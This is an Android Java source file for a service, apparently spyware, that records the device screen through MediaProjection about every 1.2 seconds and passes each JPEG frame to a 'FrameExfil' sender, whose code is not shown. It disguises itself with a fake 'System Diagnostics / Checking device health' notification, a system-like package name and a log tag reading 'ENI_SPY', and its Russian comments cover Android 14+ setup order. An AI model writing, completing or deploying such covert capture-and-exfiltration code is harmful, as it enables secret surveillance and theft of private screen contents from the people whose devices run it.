package com.android.sysdiag;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.atomic.AtomicBoolean;

public class ScreenCaptureService extends Service {

    private static final String TAG = "ENI_SPY";
    private static final String CHANNEL_ID = "sys_diag";
    private static final int NOTIF_ID = 0xDEAD;
    private static final String EXTRA_RC = "rc";
    private static final String EXTRA_RD = "rd";
    private static final long FRAME_INTERVAL_MS = 1200L;

    public static volatile boolean isRunning = false;

    private MediaProjection projection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private HandlerThread workerThread;
    private Handler worker;
    private final AtomicBoolean busy = new AtomicBoolean(false);
    private FrameExfil exfil = new FrameExfil();

    private int screenW = 720, screenH = 1280, screenDpi = 320;

    public static void start(Context ctx, int rc, Intent data) {
        Intent i = new Intent(ctx, ScreenCaptureService.class);
        i.putExtra(EXTRA_RC, rc);
        i.putExtra(EXTRA_RD, data);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(i);
        } else {
            ctx.startService(i);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand, intent=" + (intent != null));

        // КРИТИЧНО для Android 14+: startForeground ДО getMediaProjection
        try {
            startForegroundMasked();
            Log.d(TAG, "startForeground OK");
        } catch (Throwable t) {
            Log.e(TAG, "startForeground FAILED", t);
            stopSelf();
            return START_NOT_STICKY;
        }

        if (intent == null) {
            Log.e(TAG, "intent == null");
            stopSelf();
            return START_NOT_STICKY;
        }
        if (isRunning) {
            Log.d(TAG, "already running");
            return START_NOT_STICKY;
        }

        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        if (wm != null) {
            wm.getDefaultDisplay().getRealMetrics(metrics);
        }
        screenW = metrics.widthPixels;
        screenH = metrics.heightPixels;
        screenDpi = metrics.densityDpi;
        Log.d(TAG, "screen=" + screenW + "x" + screenH + " dpi=" + screenDpi);

        int rc = intent.getIntExtra(EXTRA_RC, Activity.RESULT_CANCELED);
        Intent data = intent.getParcelableExtra(EXTRA_RD);
        Log.d(TAG, "rc=" + rc + " data=" + (data != null));

        if (rc != Activity.RESULT_OK || data == null) {
            Log.e(TAG, "no valid projection data");
            stopSelf();
            return START_NOT_STICKY;
        }

        MediaProjectionManager mpm =
            (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        if (mpm == null) {
            Log.e(TAG, "mpm null");
            stopSelf();
            return START_NOT_STICKY;
        }

        try {
            // getMediaProjection ПОСЛЕ startForeground
            projection = mpm.getMediaProjection(rc, data);
            Log.d(TAG, "projection=" + projection);
            if (projection == null) { stopSelf(); return START_NOT_STICKY; }

            // Callback регистрируем ДО createVirtualDisplay
            projection.registerCallback(new MediaProjection.Callback() {
                @Override public void onStop() {
                    Log.w(TAG, "MediaProjection.onStop");
                    cleanup();
                    stopSelf();
                }
            }, new Handler(Looper.getMainLooper()));
            Log.d(TAG, "callback registered");

            // ImageReader
            imageReader = ImageReader.newInstance(
                screenW, screenH, PixelFormat.RGBA_8888, 2
            );
            Log.d(TAG, "imageReader created");

            // VirtualDisplay
            virtualDisplay = projection.createVirtualDisplay(
                "SysVD", screenW, screenH, screenDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, null
            );
            Log.d(TAG, "virtualDisplay=" + virtualDisplay);
            if (virtualDisplay == null) {
                cleanup();
                stopSelf();
                return START_NOT_STICKY;
            }

        } catch (Throwable t) {
            Log.e(TAG, "SETUP FAILED", t);
            cleanup();
            stopSelf();
            return START_NOT_STICKY;
        }

        workerThread = new HandlerThread("SysWorker");
        workerThread.start();
        worker = new Handler(workerThread.getLooper());

        isRunning = true;
        worker.post(captureLoop);
        Log.d(TAG, "SERVICE STARTED OK");

        return START_NOT_STICKY;
    }

    private final Runnable captureLoop = new Runnable() {
        @Override
        public void run() {
            if (!isRunning) return;
            try {
                if (isScreenOn()) grabFrame();
            } catch (Throwable t) {
                Log.e(TAG, "captureLoop error", t);
            }
            if (worker != null) worker.postDelayed(this, FRAME_INTERVAL_MS);
        }
    };

    private boolean isScreenOn() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        return pm != null && pm.isInteractive();
    }

    private void grabFrame() {
        if (!busy.compareAndSet(false, true)) return;
        try {
            ImageReader reader = imageReader;
            if (reader == null) return;
            Image image = reader.acquireLatestImage();
            if (image == null) return;
            try {
                byte[] jpeg = imageToJpeg(image);
                if (jpeg != null) {
                    final byte[] fj = jpeg;
                    new Thread(() -> {
                        try {
                            exfil.send(fj);
                        } catch (Throwable t) {
                            Log.e(TAG, "exfil.send error", t);
                        }
                    }).start();
                }
            } finally {
                image.close();
            }
        } catch (Throwable t) {
            Log.e(TAG, "grabFrame error", t);
        } finally {
            busy.set(false);
        }
    }

    private byte[] imageToJpeg(Image image) {
        Image.Plane plane = image.getPlanes()[0];
        ByteBuffer buffer = plane.getBuffer();
        int pixelStride = plane.getPixelStride();
        int rowStride = plane.getRowStride();
        int rowPadding = rowStride - pixelStride * screenW;

        Bitmap bmp = Bitmap.createBitmap(
            screenW + rowPadding / pixelStride,
            screenH,
            Bitmap.Config.ARGB_8888
        );
        bmp.copyPixelsFromBuffer(buffer);

        Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, screenW, screenH);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        cropped.compress(Bitmap.CompressFormat.JPEG, 55, out);
        bmp.recycle();
        cropped.recycle();
        return out.toByteArray();
    }

    private void startForegroundMasked() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm =
                (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null && nm.getNotificationChannel(CHANNEL_ID) == null) {
                NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Diagnostics", NotificationManager.IMPORTANCE_LOW
                );
                ch.setShowBadge(false);
                ch.enableVibration(false);
                ch.setSound(null, null);
                nm.createNotificationChannel(ch);
            }
        }
        Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Diagnostics")
            .setContentText("Checking device health…")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, n,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(NOTIF_ID, n);
        }
    }

    private void cleanup() {
        isRunning = false;
        if (worker != null) worker.removeCallbacksAndMessages(null);
        if (virtualDisplay != null) {
            try { virtualDisplay.release(); } catch (Throwable ignored) {}
            virtualDisplay = null;
        }
        if (imageReader != null) {
            try { imageReader.close(); } catch (Throwable ignored) {}
            imageReader = null;
        }
        if (projection != null) {
            try { projection.stop(); } catch (Throwable ignored) {}
            projection = null;
        }
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "onDestroy");
        cleanup();
        if (workerThread != null) workerThread.quitSafely();
        super.onDestroy();
    }
}
